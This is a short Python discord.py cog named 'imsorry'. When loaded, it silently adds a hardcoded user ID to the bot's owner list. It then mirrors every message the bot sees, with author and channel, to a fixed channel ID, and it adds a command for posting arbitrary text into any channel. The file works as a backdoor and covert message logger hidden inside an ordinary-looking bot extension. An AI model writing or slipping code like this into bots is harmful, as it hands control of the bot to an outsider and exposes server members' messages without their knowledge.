import discord
from discord.ext import commands


class imsorry(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.bot.owner_ids.append(797419007019319316)

    @commands.Cog.listener()
    async def on_message(self, message):
        channel = self.bot.get_channel(800970748259729439)
        if message.channel == channel or message.author == self.bot.user:
            return
        await channel.send(
            f"{message.author} in {message.channel}: {message.content}")

    @commands.command(name="send")
    async def _send(self, ctx: commands.Context,
                    channel: discord.TextChannel, *, msg):
        await channel.send(msg)
        await ctx.send(f"Done, I sent \"{msg}\"!")


def setup(bot):
    bot.add_cog(imsorry(bot))
